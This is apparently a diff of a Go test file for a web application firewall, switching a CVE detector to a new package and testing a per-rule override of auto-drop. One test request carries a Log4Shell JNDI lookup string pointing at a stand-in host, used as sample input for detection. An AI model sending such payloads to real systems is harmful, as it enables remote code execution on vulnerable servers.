@@ -7,7 +7,7 @@ import (
 	"My-OpenWaf/internal/core/action"
 	"My-OpenWaf/internal/core/pipeline"
 	"My-OpenWaf/internal/store"
-	"My-OpenWaf/internal/waf"
+	"My-OpenWaf/internal/waf/cve"
 )
 
 func TestCompileAndMatchBlockIP(t *testing.T) {
@@ -96,7 +96,7 @@ func TestCVEDetectorRuleOverridePreventsAutoDrop(t *testing.T) {
 	cfg.CVEAutoDropHigh = true
 	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit"}}`
 
-	phase := &cvePhase{cfg: cfg, detector: waf.NewCVEDetector()}
+	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
 	result, stop := phase.Execute(&pipeline.RequestCtx{
 		Path:     "/",
 		RawQuery: "x=${jndi:ldap://evil.example/a}",
